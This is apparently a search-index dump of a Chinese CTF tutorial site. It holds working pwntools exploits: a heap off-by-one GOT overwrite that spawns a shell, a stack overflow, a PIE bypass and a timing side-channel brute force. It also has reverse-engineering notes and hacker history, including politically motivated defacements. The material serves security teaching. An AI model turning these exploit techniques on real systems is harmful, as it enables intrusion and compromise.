  io.recvuntil(\"Your choice :\")\n    io.sendline(\"3\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\ndef delete(index):\n    io.recvuntil(\"Your choice :\")\n    io.sendline(\"4\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\nadd(0x18,'hhhh')\nadd(0x10,'aaaa')\nadd(0x10,'pppp')\nadd(0x10,b'/bin/sh\\x00')\n#gdb.attach(io)\n#pause()\n\npayload1 = b'a' * 0x18 + p8(0x81)\n\nedit(0,payload1)\ndelete(1)\n#gdb.attach(io)\n#pause()\n\nsize = 0x8\npayload2 = b'a' * 0x40 + p64(size) + p64(elf.got[\"free\"])\nadd(0x70,payload2)\ngdb.attach(io)\npause()\n\nshow(2)\nio.recvuntil(\"Content : \")\n\nfree_addr = u64(io.recvuntil(\"Done\")[:-5].ljust(8,b'\\x00'))\n\nlibc = LibcSearcher(\"free\",free_addr)\nlibc_base = free_addr - libc.dump(\"free\")\nsystem = libc_base + libc.dump(\"system\")\n\npayload3 = p64(system)\nedit(2,payload3)\ndelete(3)\n\nio.interactive()\n</code></pre>"},{"location":"Pwn/Chapter7/","title":"Index","text":""},{"location":"Pwn/Chapter7/#\u7ea2\u5ba2","title":"\u7ea2\u5ba2","text":"<p>\u7ea2\u5ba2\u8d77\u6e90\u4e8e 1999 \u5e74\u7684\u4e94\u516b\u4e8b\u4ef6\uff0c\u5728\u7f8e\u56fd\u8f70\u70b8\u4e2d\u56fd\u9a7b\u5357\u65af\u62c9\u592b\u5927\u4f7f\u9986\u540e\u7684\u7b2c\u4e8c\u5929\uff0c\u4e2d\u56fd\u4fe1\u606f\u5b89\u5168\u4ece\u4e1a\u8005\u82d7\u5f97\u96e8\u5236\u4f5c\u4e86\u7b2c\u4e00\u4e2a\u7ea2\u5ba2\u7f51\u7ad9\u2014\u2014\u201c\u4e2d\u56fd\u7ea2\u5ba2\u4e4b\u7956\u56fd\u56e2\u7ed3\u9635\u7ebf\u201d\uff08\u968f\u540e\u76847\u6708\u4efd\u6539\u540d\u4e3a\u201c\u4e2d\u56fd\u7ea2\u5ba2\u4e4b\u7956\u56fd\u7edf\u4e00\u6218\u7ebf\u201d\uff09\uff0c\u5176\u8bcd\u8bed\u6765\u6e90\u4e8e\u65b0\u52a0\u5761\u300a\u8054\u5408\u65e9\u62a5\u300b\u7684\u4e00\u7bc7\u62a5\u9053\u5f62\u5bb9\u7684\u201c\u7ea2\u65d7\u4e0b\u7684\u9ed1\u5ba2\u201d\uff0c\u7531\u6b64\u521b\u9020\u51fa\u4e86\u4e00\u4e2a\u65b0\u7684\u9ed1\u5ba2\u5206\u652f\u2014\u2014\u201c\u7ea2\u5ba2\u201d\u3002\u80cc\u79bb\u9ed1\u5ba2\u6240\u8c13\u7684\u65e0\u653f\u5e9c\u4e3b\u4e49\u7cbe\u795e\uff0c\u4ee5\u5ba3\u626c\u7231\u56fd\u4e3b\u4e49\u4e0b\u7684\u9ed1\u5ba2\u7cbe\u795e\u4e3a\u4e3b\u5bfc\uff0c\u5e76\u5f15\u7528\u4e86\u6bdb\u6cfd\u4e1c\u9752\u5e74\u65f6\u7684\u8bdd\u8bed\uff1a\u201c\u56fd\u5bb6\u662f\u6211\u4eec\u7684\u56fd\u5bb6\uff0c\u4eba\u6c11\u662f\u6211\u4eec\u7684\u4eba\u6c11\uff0c\u6211\u4eec\u4e0d\u558a\u8c01\u558a\uff1f\u6211\u4eec\u4e0d\u5e72\u8c01\u5e72\uff1f\u201d\u3002\u7f51\u7ad9\u5728\u77ed\u77ed\u7684\u6570\u5929\u5185\u8bbf\u95ee\u91cf\u5df2\u8fbe50\u591a\u4e07\uff0c\u5e76\u51fa\u73b0\u5728\u65b0\u6d6a\u7f51\u7684\u65b0\u95fb\u94fe\u63a5\u4e2d</p> <p>2010 \u5e74\u767e\u5ea6\u57df\u540d\u88ab\u52ab\u6301\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u6709\u81ea\u79f0\u4e2d\u56fd\u7ea2\u5ba2\u7684\u7f51\u6c11\u547c\u5401\u653b\u51fb\u4f0a\u6717\u7f51\u7ad9\u3002\u968f\u540e\uff0c\u4f0a\u6717\u4e00\u57df\u540d\u4e3airibu.ir\u7684\u6559\u80b2\u673a\u6784\u7f51\u7ad9\u88ab\u653b\u51fb\uff0c\u5728\u767e\u5ea6\u7f51\u7ad9\u88ab\u653b\u51fb\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u8be5\u6559\u80b2\u673a\u6784\u7f51\u7ad9\u9875\u9762\u51fa\u73b0\u9ed1\u5c4f\uff0c\u4e4b\u540e\u51fa\u73b0 \u201cLong live The People's Republic of China\u201d\uff08\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u4e07\u5c81\uff09\u7684\u5b57\u6837\u3002\u800c\u591a\u4e2a\u4f0a\u6717\u653f\u5e9c\u7f51\u7ad9\u4ea6\u88ab\u4e2d\u56fd\u9ed1\u5ba2\u653b\u51fb</p> <p>2010 \u5e74\u9a6c\u5c3c\u62c9\u524d\u8b66\u5458\u52ab\u6301\u9999\u6e2f\u65c5\u884c\u56e2\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u83f2\u5f8b\u5bbe\u5e03\u62c9\u5e72\u7701\u653f\u5e9c\u5b98\u7f51\u7591\u4f3c\u88ab\u4e2d\u56fd\u7ea2\u5ba2\u653b\u51fb\u3002\u9ed1\u5ba2\u5728\u7f51\u9875\u4e0a\u60ac\u6302\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u56fd\u65d7\uff0c\u5e76\u7559\u4e0b\u4e86\u8981\u6c42\u83f2\u5f8b\u5bbe\u653f\u5e9c\u5c31\u83f2\u52ab\u6301\u4eba\u8d28\u4e8b\u4ef6\u505a\u9053\u6b49\u7684\u6587\u5b57</p> <p>2011 \u5e74\uff0c\u5357\u6d77\u95ee\u9898\u4e0d\u65ad\u5347\u7ea7\uff0c\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u591a\u5bb6\u5730\u65b9\u653f\u5e9c\u7f51\u7ad9\u906d\u8d8a\u5357\u9ed1\u5ba2\u653b\u51fb\uff0c\u88ab\u5165\u4fb5\u7f51\u7ad9\u6807\u6709\u201c\u8d8a\u5357\u9ed1\u5ba2\u662f\u7b2c\u4e00\u201d\uff0c\u201c\u8d8a\u5357\u4eba\u6c11\u613f\u610f\u727a\u7272\u6765\u4fdd\u62a4\u6d77\u6d0b\uff0c\u5929\u7a7a\u548c\u56fd\u5bb6\u201d\u7b49\u6587\u5b57\u3002\u4e2d\u56fd\u7ea2\u5ba2\u53cd\u51fb\u8d8a\u5357\u7f51\u7ad9\uff0c\u636e\u7edf\u8ba1\u6709\u5343\u4f59\u5bb6\u8d8a\u5357\u7f51\u7ad9\u88ab\u653b\u9677\u5e76\u6302\u4e0a\u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u56fd\u65d7</p> <p>2012 \u5e74 4 \u6708\uff0c\u4e2d\u83f2\u9ec4\u5ca9\u5c9b\u5bf9\u5cd9\u5f15\u53d1\u4e2d\u83f2\u9ed1\u5ba2\u4e92\u9ed1\u5bf9\u65b9\u56fd\u5bb6\u7f51\u7ad9\u3002\u4e2d\u56fd\u6570\u5bb6\u7f51\u7ad9\u906d\u83f2\u5f8b\u5bbe\u9ed1\u5ba2\u653b\u51fb\uff0c\u5176\u4e2d\u5305\u62ec\u201c\u4e2d\u56fd\u5927\u5b66\u751f\u81ea\u5f3a\u4e4b\u661f\u201d\u3001\u4e2d\u9752\u5728\u7ebf\u3001\u4e2d\u9752\u89c6\u9891\u7b497\u5bb6\u7f51\u7ad9\u3002\u4e2d\u56fd\u9ed1\u5ba2\u653b\u51fb\u4e86\u83f2\u5f8b\u5bbe\u5927\u5b66\u7f51\u7ad9\uff0c\u5c06\u8be5\u6821\u4e3b\u9875\u53d8\u6210\u4e00\u5f20\u9ec4\u5ca9\u5c9b\u6d77\u57df\u7684\u5730\u56fe\uff0c\u5e76\u5c06\u201c\u6211\u4eec\u6765\u81ea\u4e2d\u56fd\u201d\u3001\u201c\u9ec4\u5ca9\u5c9b\u662f\u6211\u4eec\u7684\u201d\u7b49\u6587\u5b57\u6253\u5728\u5730\u56fe\u4e0a</p> <p>2022 \u5e74 8 \u6708 2 \u65e5\uff0c\u65f6\u4efb\u7f8e\u56fd\u4f17\u8bae\u9662\u8bae\u957f\u4f69\u6d1b\u897f\u8bbf\u53f0\uff0c\u4e2d\u534e\u6c11\u56fd\u603b\u7edf\u5e9c\u5b98\u7f51\u906d\u5230\u4e2d\u56fd\u7ea2\u5ba2\u653b\u51fb\u30022022 \u5e74 8\u6708 3 \u65e5\uff0c\u53f0\u6e7e\u9ad8\u94c1\u516c\u53f8\u65b0\u5de6\u8425\u7ad9\u7684\u5e7f\u544a\u770b\u677f\u4ee5\u53ca\u8d85\u5546\u95e8\u5e02\u7684\u5c4f\u5e55\u968f\u540e\u4e5f\u88ab\u690d\u5165\u6709\u5173\u201c\u53cd\u4f69\u6d1b\u897f\u201d\u7684\u6587\u5b57\u3002\u4e4b\u540e 2022 \u5e74 8 \u6708 6 \u65e5\uff0c\u53f0\u6e7e\u6c11\u89c6\u7535\u89c6\u53f0\u88ab\u4e2d\u56fd\u7ea2\u5ba2\u5165\u4fb5\u3002\u4e4b\u540e\u665a\u95f4\u65f6\u523b\u6709\u7f51\u53cb\u5ffd\u7136\u53d1\u73b0\u6c11\u89c6\u7535\u89c6\u53f0\u51fa\u73b0\u4e86\u4e00\u9762\u4e2d\u56fd\u7248\u56fe\u4ee5\u53ca\u7b80\u4f53\u5b57\u201c\u4e2d\u56fd\u4e00\u70b9\u90fd\u4e0d\u80fd\u5c11\u201d\u7684\u5b57\u6837\u5916\u52a0\u80cc\u666f\u97f3\u4e50\u300a\u6211\u548c\u6211\u7684\u7956\u56fd\u300b\u603b\u5171\u7ef4\u63013\u5206\u949f</p> <p></p>"},{"location":"Pwn/Chapter7/7-1/","title":"\u65f6\u95f4\u4fa7\u4fe1\u9053\u653b\u51fb","text":""},{"location":"Pwn/Chapter7/7-1/#\u65f6\u95f4\u4fa7\u4fe1\u9053\u653b\u51fb","title":"\u65f6\u95f4\u4fa7\u4fe1\u9053\u653b\u51fb","text":"<p>\u7ed9\u51fa\u4e86\u6e90\u7801\u53ca\u6587\u4ef6</p> <pre><code>const char *flag = \"0123456789abcdef\"; // fake flag\n\nint _strcmp(const char *s1, const char *s2){\n    int l = strlen(s2);\n    for(int i = 0; i&lt;=l; i++){\n         // \u5728\u6bcf\u6b21\u5faa\u73af\u4e2d\uff0c\u6bd4\u8f83 s1 \u548c s2 \u5728\u5f53\u524d\u7d22\u5f15\u4f4d\u7f6e\u7684\u5b57\u7b26\n         // \u5982\u679c\u5b57\u7b26\u76f8\u7b49\uff0c\u8c03\u7528 usleep(100000)\n        if(*(s1+i) != *(s2+i)) return 0;\n        usleep(100000);\n    }\n    return 1;\n}\n\nint main(){\n    char buf[0x10] = {0};\n    printf(\"input your flag: \");\n    scanf(\"%15s\", buf);\n    if(_strcmp(buf)) printf(\"Here is your flag: flag{%s}\\n\", buf);\n    else printf(\"Sorry, try again~\\n\");\n    return 0;\n}\n</code></pre> <p>\u7f16\u5199\u811a\u672c\u6839\u636e\u65f6\u95f4\u7206\u7834\uff08\u7b80\u5316\u7248\u7684\uff0c\u786e\u8ba4 flag \u4e3a 15 \u4f4d\uff09</p> <pre><code>import time, os\n\nflag = ''\nfor i in range(15):\n    for j in '0123456789abcdef':\n        # \u4f7f\u7528\u5b57\u7b26 t \u586b\u5145\u81f3 15 \u4f4d\n        tmp = (flag + j).ljust(15, 't')\n        start = time.time()\n        os.system(f\"echo {tmp} | ./task &gt; /dev/null\")\n        if (time.time() - start) &gt; (i + 1) * 0.1:\n            flag += j\n            break\n    print(flag)\nos.system(f\"echo {flag} | ./task\")\n</code></pre> <p></p>"},{"location":"Pwn/Chapter99/99-1/","title":"32 \u4f4d Gets \u6808\u6ea2\u51fa","text":""},{"location":"Pwn/Chapter99/99-1/#32-\u4f4d-gets-\u6808\u6ea2\u51fa","title":"32 \u4f4d Gets \u6808\u6ea2\u51fa","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\u540e\u5148\u52a0\u6743\u9650</p> <pre><code>chmod +x server\n</code></pre> <p></p> <p>\u8fd9\u9898\u6211\u4eec\u5c1d\u8bd5\u5148\u4e0d\u53cd\u7f16\u8bd1\u770b\u80fd\u4e0d\u80fd\u627e\u51fa\u6f0f\u6d1e\u70b9\u5728\u54ea</p> <pre><code>gdb server\n</code></pre> <p></p> <p>\u5148 <code>checksec</code> \u770b\u770b\u4ec0\u4e48\u7248\u672c\u53ca\u6709\u54ea\u4e9b\u4fdd\u62a4\uff08\u8fd9\u91cc\u662f 32 \u4f4d\u53ca\u6ca1\u6709\u91d1\u4e1d\u96c0\u548c PIE\uff09</p> <pre><code>checksec\n</code></pre> <p></p> <p>\u76f4\u63a5\u8f93\u5165 <code>r</code> \u8fd0\u884c\u7a0b\u5e8f</p> <p>\u8fd9\u91cc\u8981\u6211\u4eec\u8f93\u5165\u5185\u5bb9</p> <pre><code>r\n</code></pre> <p></p> <p>\u968f\u4fbf\u8f93\u5165\u6570\u503c\u540e\u53d1\u73b0\u7a0b\u5e8f\u7ed3\u675f\u4e86\uff0c\u7531\u6b64\u5224\u65ad\u53ea\u6709\u8fd9\u4e00\u4e2a\u8f93\u5165\u70b9\uff08\u672c\u8282\u4e3b\u8981\u8bb2\u52a8\u6001\u8c03\u8bd5\uff0c\u5c31\u4e0d\u89e3\u6790\u8f93\u51fa\u5185\u5bb9\u4e86\uff09</p> <pre><code>123456\n</code></pre> <p></p> <p>\u5148\u751f\u6210\u4e24\u767e\u4e2a\u5b57\u7b26\u65b9\u4fbf\u6211\u4eec\u8f93\u5165</p> <pre><code>cyclic 200\n</code></pre> <p></p> <p>\u518d\u6b21\u8fd0\u884c\u7a0b\u5e8f</p> <pre><code>r\n</code></pre> <p></p> <p>\u8f93\u5165\u6211\u4eec\u751f\u6210\u7684\u5b57\u7b26\u53d1\u73b0\u7a0b\u5e8f\u5d29\u6e83\u4e86</p> <pre><code>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n</code></pre> <p></p> <p>\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u9996\u5148\u67e5\u770b\u5404\u4e2a\u5bc4\u5b58\u5668\u7684\u503c</p> <pre><code>context\n</code></pre> <p></p> <p>\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u770b\u5bc4\u5b58\u5668 EIP \u7684\u503c</p> <p>EIP \u662f 32 \u4f4d x86 \u67b6\u6784\u4e2d\u7684\u201c\u6269\u5c55\u6307\u4ee4\u6307\u9488\u201d\u5bc4\u5b58\u5668\uff0c\u7528\u4e8e\u5b58\u50a8\u4e0b\u4e00\u6761\u5c06\u8981\u6267\u884c\u7684\u673a\u5668\u6307\u4ee4\u7684\u5730\u5740</p> <p>\u56e0\u6b64\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u5229\u7528\u4e2d\uff0c\u8986\u76d6 EIP \u5373\u53ef\u6539\u53d8\u7a0b\u5e8f\u7684\u6267\u884c\u6d41</p> <p>\u6211\u4eec\u53d1\u73b0 EIP \u4e3a\u6211\u4eec\u8f93\u5165\u7684\u5b57\u7b26\uff0c\u6240\u4ee5\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u662f\u53ef\u4ee5\u63a7\u5236 EIP \u7684\u503c</p> <pre><code>EIP  0x61616170 ('paaa')\n</code></pre> <p>\u6240\u4ee5\u4e0b\u4e00\u6b65\u5c31\u662f\u8981\u786e\u8ba4\u6211\u4eec\u8f93\u4e86\u591a\u5c11\u4e2a\u5b57\u7b26\u540e\u624d\u5230 EIP\uff0c\u4e5f\u5c31\u662f\u786e\u8ba4\u504f\u79fb</p> <p>\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u547d\u4ee4\u53bb\u67e5\u627e <code>paaa</code> \u7684\u504f\u79fb\u5c31\u884c</p> <pre><code>cyclic -l \"paaa\"\n</code></pre> <p>\u786e\u8ba4\u4e86\u504f\u79fb\u4e3a 60 \u5b57\u8282</p> <p></p> <p>\u7136\u540e\u8fd8\u662f\u501f\u52a9\u9759\u6001\u5de5\u5177\u770b\u6709\u6ca1\u6709\u540e\u95e8\u51fd\u6570\u4e4b\u7c7b\u7684</p> <p></p> <p>\u6784\u9020 payload</p> <pre><code>from pwn import *\n\np = remote(\"thekidofarcrania.com\", 4902)\n\npayload = b'a' * 60 + p32(0x08048586)\n\np.recvuntil('Input some text:')\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"Pwn/Chapter99/99-2/","title":"\u56fa\u5b9a\u504f\u79fb\u91cf\u7ed5\u8fc7 PIE","text":""},{"location":"Pwn/Chapter99/99-2/#\u56fa\u5b9a\u504f\u79fb\u91cf\u7ed5\u8fc7-pie","title":"\u56fa\u5b9a\u504f\u79fb\u91cf\u7ed5\u8fc7 PIE","text":"<p>\u6253\u5f00\u73af\u5883\u4f1a\u7ed9\u51fa\u6e90\u7801\u53ca\u6e90\u7a0b\u5e8f\uff08\u76f8\u6bd4\u5bf9\u56fd\u5185\u9776\u573a\u66f4\u7b80\u5355\u4e86\uff09</p> <p>\u6211\u4eec\u53ea\u8981\u8c03\u7528\u8fd9\u4e2a <code>win()</code> \u51fd\u6570\u5c31\u53ef\u4ee5\u62ff\u5230 flag</p> <pre><code>void segfault_handler() {\n  printf(\"Segfault Occurred, incorrect address.\\n\");\n  exit(0);\n}\n\nint win() {\n  FILE *fptr;\n  char c;\n\n  printf(\"You won!\\n\");\n  // \u6253\u5f00\u6587\u4ef6\n  fptr = fopen(\"flag.txt\", \"r\");\n  if (fptr == NULL)\n  {\n      printf(\"\u65e0\u6cd5\u6253\u5f00\u6587\u4ef6\u3002\\n\");\n      exit(0);\n  }\n\n  // \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u5185\u5bb9\n  c = fgetc(fptr);\n  while (c != EOF)\n  {\n      printf (\"%c\", c);\n      c = fgetc(fptr);\n  }\n\n  printf(\"\\n\");\n  fclose(fptr);\n}\n\nint main() {\n  signal(SIGSEGV, segfault_handler);\n  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = \u65e0\u7f13\u51b2\u8f93\u51fa\n\n  printf(\"Address of main: %p\\n\", &amp;main);\n\n  unsigned long val;\n  printf(\"Enter the address to jump to, ex =&gt; 0x12345: \");\n  scanf(\"%lx\", &amp;val);\n  printf(\"Your input: %lx\\n\", val);\n\n  void (*foo)(void) = (void (*)())val;\n  foo();\n}\n</code></pre> <p>\u52a8\u6001\u8c03\u5f0f\u8981\u6211\u4eec\u8f93\u5165\u4e00\u4e2a\u5730\u5740\u8df3\u8f6c\uff0c\u5e76\u7ed9\u51fa\u4e86 <code>main()</code> \u51fd\u6570\u7684\u5730\u5740</p> <p>\u6211\u4eec\u8f93\u5165\u8fd9\u4e2a <code>main()</code> \u51fd\u6570\u7684\u5730\u5740\u540e\u679c\u7136\u8df3\u5230\u4e86\u8fd9\u4e2a\u5730\u5740\uff0c\u8981\u91cd\u65b0\u8f93\u5165</p> <p></p> <p>\u68c0\u67e5\u53d1\u73b0\u4fdd\u62a4\u5168\u5f00\uff0c\u6709 PIE \u6240\u4ee5\u6ca1\u529e\u6cd5\u76f4\u63a5\u8f93\u5165\u5728 IDA \u4e2d\u89e3\u6790\u7684 <code>win()</code> \u51fd\u6570\u5730\u5740</p> <p></p> <p>\u8f93\u5165</p> <pre><code>info functions main\n</code></pre> <p>\u53ef\u4ee5\u5217\u51fa\u6240\u6709\u4ee5 <code>main</code> \u5f00\u5934\u7684\u51fd\u6570\uff08\u53bb\u6389 <code>main</code> \u5219\u662f\u6240\u6709\uff09</p> <p>\u5728\u6700\u540e\u4e00\u884c\u53ef\u4ee5\u770b\u5230 <code>main()</code> \u51fd\u6570\u7684\u5730\u5740\u4e0e\u5f00\u5934\u5bf9\u5e94</p> <p></p> <p>\u540c\u6837\u7684\u65b9\u6cd5\u5728\u53bb\u627e\u4e0b <code>win()</code> \u51fd\u6570</p> <p></p> <p>\u8ba1\u7b97\u504f\u79fb\u5f97\u5230\u662f\u5341\u8fdb\u5236 150\uff0c\u6240\u4ee5\u6253\u8fdc\u7a0b\u65f6\u51cf\u53bb\u504f\u79fb\u5c31\u662f <code>win()</code> \u51fd\u6570\u5730\u5740</p> <p></p>"},{"location":"Reverse/","title":"\u4ecb\u7ecd","text":"<p>\u4f5c\u8005\u6b63\u5728\u7f16\u5199\u4e2d</p>"},{"location":"Reverse/Chapter1/","title":"Index","text":""},{"location":"Reverse/Chapter1/#kevin-mitnick","title":"Kevin Mitnick","text":"<p>\u7f8e\u56fd\u4eba Kevin Mitnick \u582a\u79f0\u9ed1\u5ba2\u9f3b\u7956\uff0c\u4ed6\u7684\u9ed1\u5ba2\u751f\u6daf\u59cb\u4e8e\u5c11\u5e74\u65f6\u671f\u3002</p> <p>1979 \u5e74\uff0c\u4fb5\u5165\u4e86 DEC \u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u5e76\u590d\u5236\u4e86\u8be5\u516c\u53f8\u7684\u8f6f\u4ef6\u5e76\u4e8e 1988 \u5e74\u56e0\u8fd9\u4e00\u7f6a\u884c\u88ab\u6307\u63a7\u5e76\u5b9a\u7f6a\u3002\u4ed6\u88ab\u5224\u5904 12 \u4e2a\u6708\u76d1\u7981\uff0c\u968f\u540e\u63a5\u53d7\u4e09\u5e74\u7684\u76d1\u5916\u770b\u7ba1</p> <p>\u76d1\u5916\u770b\u7ba1\u671f\u5373\u5c06\u7ed3\u675f\u4e4b\u9645\uff0cKevin Mitnick \u5165\u4fb5\u4e86\u592a\u5e73\u6d0b\u8d1d\u5c14\u8bed\u97f3\u4fe1\u7bb1\u8ba1\u7b97\u673a\u3002\u5728\u902e\u6355\u4ee4\u53d1\u51fa\u540e\uff0c\u7c73\u7279\u5c3c\u514b\u6f5c\u9003\uff0c\u5728\u9003\u4ea1\u4e86\u4e24\u5e74\u534a</p> <p>\u5728\u9003\u671f\u95f4\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u4e86\u6570\u5341\u4e2a\u8ba1\u7b97\u673a\u7f51\u7edc\uff0c\u4ed6\u4f7f\u7528\u514b\u9686\u7684\u624b\u673a\u9690\u85cf\u81ea\u5df1\u7684\u4f4d\u7f6e</p> <p>\u5728\u4ed6\u7684\u76d1\u7763\u91ca\u653e\u671f\u95f4\uff0c\u4ed6\u6700\u521d\u88ab\u7981\u6b62\u4f7f\u7528\u9664\u56fa\u5b9a\u7535\u8bdd\u4e4b\u5916\u7684\u4efb\u4f55\u901a\u8baf\u6280\u672f</p> <p>2000 \u5e74\u83b7\u91ca\u540e\uff0c\u7c73\u7279\u5c3c\u514b\u6210\u4e3a\u4e00\u540d\u6709\u507f\u5b89\u5168\u987e\u95ee\u3001\u516c\u4f17\u6f14\u8bb2\u8005\u548c\u4f5c\u5bb6\u3002\u4ed6\u4e3a\u516c\u53f8\u548c\u653f\u5e9c\u673a\u6784\u63d0\u4f9b\u5b89\u5168\u54a8\u8be2\u3001\u6e17\u900f\u6d4b\u8bd5\u670d\u52a1\u5e76\u6559\u6388\u793e\u4f1a\u5de5\u7a0b\u5b66\u8bfe\u7a0b</p> <p>Kevin Mitnick \u4e8e 2023 \u5e74 7 \u6708 16 \u65e5\u5728\u5bbe\u5915\u6cd5\u5c3c\u4e9a\u5dde\u5339\u5179\u5821\u4e00\u5bb6\u533b\u9662\u56e0\u80f0\u817a\u764c\u53bb\u4e16</p> <p></p>"},{"location":"Reverse/Chapter1/1-1/","title":"Dll \u53cd\u7f16\u8bd1","text":""},{"location":"Reverse/Chapter1/1-1/#dll-\u53cd\u7f16\u8bd1","title":"Dll \u53cd\u7f16\u8bd1","text":"<p>\u4e0b\u8f7d\u6587\u4ef6\u662f\u4e00\u4e2a dll\uff0c\u4f7f\u7528\u5de5\u5177 dnSpy \u53cd\u7f16\u8bd1\u5373\u53ef\u627e\u5230\u5bc6\u7801</p> <p></p>"},{"location":"Reverse/Chapter1/1-2/","title":"EXE \u53cd\u7f16\u8bd1","text":""},{"location":"Reverse/Chapter1/1-2/#exe-\u53cd\u7f16\u8bd1","title":"EXE \u53cd\u7f16\u8bd1","text":"<p>\u7ed9\u7684\u662f exe \u7a0b\u5e8f\uff0c\u786e\u8ba4\u65e0\u58f3\u53ca\u4f4d\u6570\u540e\u76f4\u63a5\u653e\u5165 IDA \u4e2d\u53cd\u7f16\u8bd1</p> <p></p> <p>\u9996\u5148\u67e5\u770b main \u51fd\u6570</p> <p></p> <p>\u5728\u6d41\u7a0b\u7a97\u53e3\u4e2d\u6ce8\u91ca\u7ed9\u51fa\u4e86 flag</p> <p></p>"},{"location":"Reverse/Chapter10/10-1/","title":"\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22","text":""},{"location":"Reverse/Chapter10/10-1/#\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22","title":"\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22","text":"<p>python \u7684 exe 3.11 \u89e3\u5305\u53cd\u7f16\u8bd1\u53d1\u73b0\u5f80\u4e0b\u8d70\u624d\u4f1a\u7ed9\u51fa\u5b8c\u6574\u5730\u56fe \u8fd8\u6709\u51fa\u53e3 \u76f4\u63a5\u624b\u52a8\u8d70\u4e00\u4e0b\u5f97\u5230</p> <pre><code>################################   \n#Y#                   #       X#   \n# # ############# ### # ### ## #   \n# #   #         # #   #   #   ##   \n# ##### ####### ### # ### ### ##   \n#   #   #     # #   #   # #   ##   \n### # ### ##### # ####### # ####   \n# #   # #     # #     #   #   ##   \n# ##### # ### # # ### # ##### ##   \n#         #   # #   #       # ##   \n# ######### # # ############# ##   \n#   # #     # #   #           ##   \n### # # ######### # ######### ##   \n# # # #           # #       # ##   \n# # # ############# # ##### # ##   \n#   #       #       # #   #   ##   \n#X ## ### ### # ##### # ########   \n#   #   #     #   # # #   #   ##   \n### ### ######### # # # # # # ##   \n# # #   #   #   # # # # # # # ##   \n# # ### # # # # # # # ### # # ##   \n# #   # # #   #   #   #   # # ##   \n# ### ### ########### # # # # ##   \n#   #   #           # # # # # ##   \n# ##### # ######### # # ### # ##   \n#   #   #   #       # # #   # ##   \n### # ####### ####### # # ### ##   \n#   #   #   # #     # #   #   ##   \n# ##### # # # # ##### ##### # ##   \n#         #   #             #   #   \n#X ############ X ########### X#   \n################################\n</code></pre> <p>\u6413\u4e2a BFS \u8dd1\u4e00\u4e0b\u6700\u77ed\u8def\u5f84</p> <pre><code>from collections import deque   \n\ndef parse_map(map_str):   \n    map_data = map_str.strip().split('\\n')   \n    rows = len(map_data)   \n    cols = len(map_data[0]) if rows &gt; 0 else 0   \n    start = None   \n    exits = []   \n    for y in range(rows):   \n        for x in range(cols):   \n            if map_data[y][x] == 'Y':   \n                start = (y, x)   \n            elif map_data[y][x] == 'X':   \n                exits.append((y, x))   \n    return map_data, start, exits   \n\n\ndef bfs(start, targets, map_data):   \n    rows = len(map_data)   \n    cols = len(map_data[0])   \n    visited = {}   \n    queue = deque([(start[0], start[1])])   \n    visited[(start[0], start[1])] = (None, None, 0)   \n    directions = [(-1, 0, 'w'), (1, 0, 's'), (0, -1, 'a'), (0, 1, 'd')]   \n    found_targets = []   \n\n    while queue:   \n        y, x = queue.popleft()   \n        current_dist = visited[(y, x)][2]   \n\n        if (y, x) in targets:   \n            found_targets.append((y, x, current_dist))   \n\n        for dy, dx, move in directions:   \n            ny, nx = y + dy, x + dx   \n            if 0 &lt;= ny &lt; rows and 0 &lt;= nx &lt; cols:   \n                if map_data[ny][nx] != '#' and (ny, nx) not in visited:   \n                    visited[(ny, nx)] = (y, x, current_dist + 1)   \n                    queue.append((ny, nx))   \n\n    if not found_targets:   \n        return None, None   \n    target = min(found_targets, key=lambda x: x[2])   \n    path = []   \n    current = (target[0], target[1])   \n    while True:   \n        prev_info = visited.get(current)   \n        if prev_info is None or prev_info[0] is None:   \n            break   \n        py, px = prev_info[0], prev_info[1]   \n        dy = current[0] - py   \n        dx = current[1] - px   \n        if dy == 1:   \n            move = 's'   \n        elif dy == -1:   \n            move = 'w'   \n        elif dx == 1:   \n            move = 'd'   \n        else:   \n            move = 'a'   \n        path.append(move)   \n        current = (py, px)   \n    path.reverse()   \n    return ''.join(path), (target[0], target[1])   \n\n\ndef find_shortest_path(map_str):   \n    map_data, start, exits = parse_map(map_str)   \n    current_pos = start   \n    remaining_exits = set(exits)   \n    total_path = []   \n    path_details = []   # \u5b58\u50a8\u6bcf\u4e2a\u9636\u6bb5\u7684\u8def\u5f84\u8be6\u60c5   \n\n    while remaining_exits:   \n        path, exit_pos = bfs(current_pos, remaining_exits, map_data)   \n        if not path:   \n            break   \n        total_path.append(path)   \n\n        path_details.append({   \n            'from': current_pos,   \n            'to': exit_pos,   \n            'path': path,   \n            'length': len(path)   \n        })        current_pos = exit_pos   \n        remaining_exits.remove(exit_pos)   \n\n    # \u6253\u5370\u6bcf\u4e2a\u9636\u6bb5\u7684\u8def\u5f84   \n    for i, segment in enumerate(path_details):   \n        print(f\"\u9636\u6bb5 {i + 1}: \u4ece {segment['from']} \u5230 {segment['to']}\")   \n        print(f\"\u8def\u5f84: {segment['path']}\")   \n        print(f\"\u957f\u5ea6: {segment['length']}\\n\")   \n\n    full_path = ''.join(total_path)   \n    return full_path   